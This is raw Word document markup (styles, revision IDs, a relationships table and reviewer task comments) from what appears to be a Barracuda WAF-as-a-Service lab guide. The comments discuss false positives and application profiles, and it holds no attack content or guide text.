    <w:rsid w:val="75A3BDE5"/>
    <w:rsid w:val="75E1EA6F"/>
    <w:rsid w:val="75EB4A25"/>
    <w:rsid w:val="75F91AB7"/>
    <w:rsid w:val="76037E38"/>
    <w:rsid w:val="760B5E82"/>
    <w:rsid w:val="7638B136"/>
    <w:rsid w:val="763BA1C4"/>
    <w:rsid w:val="76418F0B"/>
    <w:rsid w:val="765C487B"/>
    <w:rsid w:val="766415D6"/>
    <w:rsid w:val="767550AD"/>
    <w:rsid w:val="769A5B09"/>
    <w:rsid w:val="76A67EFB"/>
    <w:rsid w:val="76AC5603"/>
    <w:rsid w:val="76B4FA07"/>
    <w:rsid w:val="76BBABBD"/>
    <w:rsid w:val="76EFAAD2"/>
    <w:rsid w:val="76F6E819"/>
    <w:rsid w:val="7712B1F0"/>
    <w:rsid w:val="771C133F"/>
    <w:rsid w:val="77209A68"/>
    <w:rsid w:val="7749D716"/>
    <w:rsid w:val="774F63EA"/>
    <w:rsid w:val="775988C0"/>
    <w:rsid w:val="7769773B"/>
    <w:rsid w:val="778FF361"/>
    <w:rsid w:val="7796E0DB"/>
    <w:rsid w:val="77B2FF43"/>
    <w:rsid w:val="77C3A48A"/>
    <w:rsid w:val="77DC03C3"/>
    <w:rsid w:val="77DE045E"/>
    <w:rsid w:val="7806C779"/>
    <w:rsid w:val="784614D6"/>
    <w:rsid w:val="785696A9"/>
    <w:rsid w:val="7869E777"/>
    <w:rsid w:val="787B7C88"/>
    <w:rsid w:val="78861EFB"/>
    <w:rsid w:val="78DA80CD"/>
    <w:rsid w:val="78E9FB9A"/>
    <w:rsid w:val="78FE08B1"/>
    <w:rsid w:val="7911D2BB"/>
    <w:rsid w:val="7973E69B"/>
    <w:rsid w:val="798C4362"/>
    <w:rsid w:val="79C60CBD"/>
    <w:rsid w:val="7A132E85"/>
    <w:rsid w:val="7A2CA1AF"/>
    <w:rsid w:val="7A2F478F"/>
    <w:rsid w:val="7A2FB86E"/>
    <w:rsid w:val="7A32892F"/>
    <w:rsid w:val="7A76512E"/>
    <w:rsid w:val="7A779474"/>
    <w:rsid w:val="7A7D3619"/>
    <w:rsid w:val="7A98A0B1"/>
    <w:rsid w:val="7AAB1B19"/>
    <w:rsid w:val="7ABF52B7"/>
    <w:rsid w:val="7ACBD262"/>
    <w:rsid w:val="7ADD0A16"/>
    <w:rsid w:val="7AE2C080"/>
    <w:rsid w:val="7AEB43BA"/>
    <w:rsid w:val="7AFA4DA6"/>
    <w:rsid w:val="7B01683B"/>
    <w:rsid w:val="7B02A5BB"/>
    <w:rsid w:val="7B06AB01"/>
    <w:rsid w:val="7B2C661B"/>
    <w:rsid w:val="7B61DD1E"/>
    <w:rsid w:val="7B853F91"/>
    <w:rsid w:val="7B8EBEDF"/>
    <w:rsid w:val="7BB21826"/>
    <w:rsid w:val="7BBF1565"/>
    <w:rsid w:val="7BCB2638"/>
    <w:rsid w:val="7BE74B42"/>
    <w:rsid w:val="7BE876DA"/>
    <w:rsid w:val="7C08B68C"/>
    <w:rsid w:val="7C0F6BAF"/>
    <w:rsid w:val="7C1471E0"/>
    <w:rsid w:val="7C1C15DA"/>
    <w:rsid w:val="7C27E3C3"/>
    <w:rsid w:val="7C38D84B"/>
    <w:rsid w:val="7C4D17AF"/>
    <w:rsid w:val="7C5D485F"/>
    <w:rsid w:val="7CAC4F28"/>
    <w:rsid w:val="7CB282C5"/>
    <w:rsid w:val="7CFDAD7F"/>
    <w:rsid w:val="7D116EAA"/>
    <w:rsid w:val="7D4FFFCD"/>
    <w:rsid w:val="7D670F09"/>
    <w:rsid w:val="7D9737B3"/>
    <w:rsid w:val="7DA3C65F"/>
    <w:rsid w:val="7DB2AD81"/>
    <w:rsid w:val="7DB38AEE"/>
    <w:rsid w:val="7DD99FAE"/>
    <w:rsid w:val="7DE37973"/>
    <w:rsid w:val="7E098B12"/>
    <w:rsid w:val="7E0BC734"/>
    <w:rsid w:val="7E25C128"/>
    <w:rsid w:val="7E3F3A78"/>
    <w:rsid w:val="7E5F1880"/>
    <w:rsid w:val="7E776988"/>
    <w:rsid w:val="7E865162"/>
    <w:rsid w:val="7E8B19AC"/>
    <w:rsid w:val="7ED87B73"/>
    <w:rsid w:val="7EEDA030"/>
    <w:rsid w:val="7F0F18B4"/>
    <w:rsid w:val="7F14FCFA"/>
    <w:rsid w:val="7F1B87F9"/>
    <w:rsid w:val="7F618BD4"/>
    <w:rsid w:val="7F685D52"/>
    <w:rsid w:val="7F698058"/>
    <w:rsid w:val="7F813D74"/>
    <w:rsid w:val="7F8F81F8"/>
    <w:rsid w:val="7F90406A"/>
    <w:rsid w:val="7FA989B1"/>
    <w:rsid w:val="7FBF68FB"/>
    <w:rsid w:val="7FD147B7"/>
    <w:rsid w:val="7FDED7F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ACA8F"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{C0AFBE99-DD7A-4C97-8BA5-9CE15BB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641"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="005320D4"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="24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20D4"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="4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01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01EA"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40" w:after="0"/>
      <w:outlineLvl w:val="3"/>
      <w15:collapsed/>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841"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="005320D4"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="29"/>
      </w:numPr>
      <w:spacing w:before="240"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00544AC0"/>
    <w:rPr>
      <w:color w:val="808080"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002B1ABD"/>
    <w:rPr>
      <w:color w:val="800080" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="004B6A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A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A8F"/>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4B6A8F"/>
    <w:rPr>
      <w:color w:val="5A5A5A" w:themeColor="text1" w:themeTint="A5"/>
      <w:spacing w:val="15"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="005320D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20D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D01E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D01EA"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="003B48A4"/>
    <w:pPr>
      <w:pBdr>
        <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
      </w:pBd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3B48A4"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00163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BC3"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>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4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="66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C24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437"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008C24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437"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002B3A4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B3A4B"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>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54298">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="50159962">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
        </w:div>
        <w:div w:id="458841338">
          <w:marLeft w:val="1800"/>
          <w:marRight w:val="1800"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="18075504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03782178">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="890386599">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1202405561">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1284269634">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1303390138">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1495103412">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1658680973">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1992562438">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="200284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pp##" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sabrett1.blob.core.windows.net/testdrive/pricelist.dat" TargetMode="External"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.png"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.microsoft.com/office/2016/09/relationships/commentsIds" Target="commentsIds.xml"/><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hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image50.png"/><Relationship Id="rId102" Type="http://schemas.microsoft.com/office/2019/05/relationships/documenttasks" Target="documenttasks/documenttasks1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://campus.barracuda.com/product/WAAS/doc/77399164/getting-started" TargetMode="Externa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hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.barracuda.com/waf-as-a-service"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www.barracuda.com/cap" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-project-top-ten/" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.png"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app" TargetMode="External"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId103" Type="http://schemas.microsoft.com/office/2018/08/relationships/commentsExtensible" Target="commentsExtensible.xm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3.png"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.png"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5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mailto:julio.tan@gmail.com" TargetMode="Externa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mailto:julio.tan@gmail.com"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5.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.barracuda.com/waf-as-a-service" TargetMode="External"/><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ampus.barracuda.com/product/WAAS/doc/77399164/getting-started" TargetMode="Externa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2.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hyperlink" Target="https://app" TargetMode="External"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image52.png"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://waas.barracudanetworks.com/" TargetMode="External"/><Relationship Id="R6881ba4d214f4dce" Type="http://schemas.microsoft.com/office/2019/09/relationships/intelligence" Target="intelligence.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="comments.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://app##" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image31.png"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4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3.png"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.png"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><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8FB42895-2E30-419F-B334-3C0D8331A369}">
    <t:Anchor>
      <t:Comment id="913649163"/>
    </t:Anchor>
    <t:History>
      <t:Event id="{B886D681-6041-4F4A-B5D6-ABF0B1FF5AE6}" time="2021-05-26T07:24:54.857Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="913649163"/>
        </t:Anchor>
        <t:Create/>
      </t:Event>
      <t:Event id="{6AE9C65A-3944-4764-A81E-B4F3D910803C}" time="2021-05-26T07:24:54.857Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="913649163"/>
        </t:Anchor>
        <t:Assign userId="S::bwolmarans@barracuda.com::f20d5f38-cfcf-4e5e-a6ee-999912314857" userProvider="AD" userName="Brett Wolmarans"/>
      </t:Event>
      <t:Event id="{E94D57C0-B9DA-4227-A8BF-73FA69D4989B}" time="2021-05-26T07:24:54.857Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="913649163"/>
        </t:Anchor>
        <t:SetTitle title="@Brett Wolmarans you may need to mention that the user not perform other tasks such as deleting the user or the resettting of the comments etc, which can potentially block access"/>
      </t:Event>
    </t:History>
  </t:Task>
  <t:Task id="{69307FA1-785C-4CBD-BFF3-0A15BBDC629E}">
    <t:Anchor>
      <t:Comment id="526890376"/>
    </t:Anchor>
    <t:History>
      <t:Event id="{8BB90F25-027A-4864-9B83-00C80719BA03}" time="2021-05-26T07:28:34.836Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="526890376"/>
        </t:Anchor>
        <t:Create/>
      </t:Event>
      <t:Event id="{07D5E082-008E-43D3-93AD-65A650297DC1}" time="2021-05-26T07:28:34.836Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="526890376"/>
        </t:Anchor>
        <t:Assign userId="S::bwolmarans@barracuda.com::f20d5f38-cfcf-4e5e-a6ee-999912314857" userProvider="AD" userName="Brett Wolmarans"/>
      </t:Event>
      <t:Event id="{1C45544B-3DAC-4099-B969-D6E39DD12354}" time="2021-05-26T07:28:34.836Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="526890376"/>
        </t:Anchor>
        <t:SetTitle title="@Brett Wolmarans should be Application Profiles"/>
      </t:Event>
    </t:History>
  </t:Task>
  <t:Task id="{E45B89AF-98F3-40FF-824F-19B63F933BDA}">
    <t:Anchor>
      <t:Comment id="232358259"/>
    </t:Anchor>
    <t:History>
      <t:Event id="{99D6433F-83FE-49A8-9072-9C1E74787EE5}" time="2021-05-26T07:29:32.141Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="232358259"/>
        </t:Anchor>
        <t:Create/>
      </t:Event>
      <t:Event id="{56B3896B-DBB5-48C1-BB95-1085765EAD97}" time="2021-05-26T07:29:32.141Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="232358259"/>
        </t:Anchor>
        <t:Assign userId="S::bwolmarans@barracuda.com::f20d5f38-cfcf-4e5e-a6ee-999912314857" userProvider="AD" userName="Brett Wolmarans"/>
      </t:Event>
      <t:Event id="{701E9AA8-3A8E-48CD-A17F-9376CD22F9C8}" time="2021-05-26T07:29:32.141Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="232358259"/>
        </t:Anchor>
        <t:SetTitle title="@Brett Wolmarans highlight this text"/>
      </t:Event>
    </t:History>
  </t:Task>
  <t:Task id="{B1687D0D-4A6D-4FD4-80B3-FBB120683D8D}">
    <t:Anchor>
      <t:Comment id="1345320674"/>
    </t:Anchor>
    <t:History>
      <t:Event id="{E0277776-54A3-48A2-8C63-ED20903E7ECA}" time="2021-05-26T07:32:25.915Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1345320674"/>
        </t:Anchor>
        <t:Create/>
      </t:Event>
      <t:Event id="{186EE9D7-DA30-4373-AF8E-9CF19DC57699}" time="2021-05-26T07:32:25.915Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1345320674"/>
        </t:Anchor>
        <t:Assign userId="S::bwolmarans@barracuda.com::f20d5f38-cfcf-4e5e-a6ee-999912314857" userProvider="AD" userName="Brett Wolmarans"/>
      </t:Event>
      <t:Event id="{A0873259-CBD0-4D09-BF0C-2EBF597C6982}" time="2021-05-26T07:32:25.915Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1345320674"/>
        </t:Anchor>
        <t:SetTitle title="@Brett Wolmarans Why should the user confiigure this exception manually, instead of marking it as a false positive and accepting the configuration change for the policy fix ??"/>
      </t:Event>
    </t:History>
  </t:Task>
  <t:Task id="{DD2DABD4-CEF0-499D-BB7D-A1E23C18E1CF}">
    <t:Anchor>
      <t:Comment id="1400559842"/>
    </t:Anchor>
    <t:History>
      <t:Event id="{5CA8D05C-93E5-495F-A87A-3557FCE2558B}" time="2021-05-26T07:37:20.55Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1400559842"/>
        </t:Anchor>
        <t:Create/>
      </t:Event>
      <t:Event id="{49E37C2A-1D6F-467C-88B4-7E8D3099A1E0}" time="2021-05-26T07:37:20.55Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1400559842"/>
        </t:Anchor>
        <t:Assign userId="S::bwolmarans@barracuda.com::f20d5f38-cfcf-4e5e-a6ee-999912314857" userProvider="AD" userName="Brett Wolmarans"/>
      </t:Event>
      <t:Event id="{2DB1A65B-B66C-41D9-99E9-1F99A1E2EAD1}" time="2021-05-26T07:37:20.55Z">
        <t:Attribution userId="S::aravindan@barracuda.com::b5283b7b-e491-4f59-aac2-17e2188ae1b5" userProvider="AD" userName="Aravindan Anandan"/>
        <t:Anchor>
          <t:Comment id="1400559842"/>
        </t:Anchor>
        <t:SetTitle title="@Brett Wolmarans Can this part be avoided somehow. This looks more like a bug than a &quot;required configuration change&quo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7fccbc4-b1de-4cd0-b913-725fd0ffe0a5">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8DB6DB9E9A5A4CB3BEAE51B1DE4187" ma:contentTypeVersion="8" ma:contentTypeDescription="Create a new document." ma:contentTypeScope="" ma:versionID="60cc7730a21e417c3937658cf7414d62">
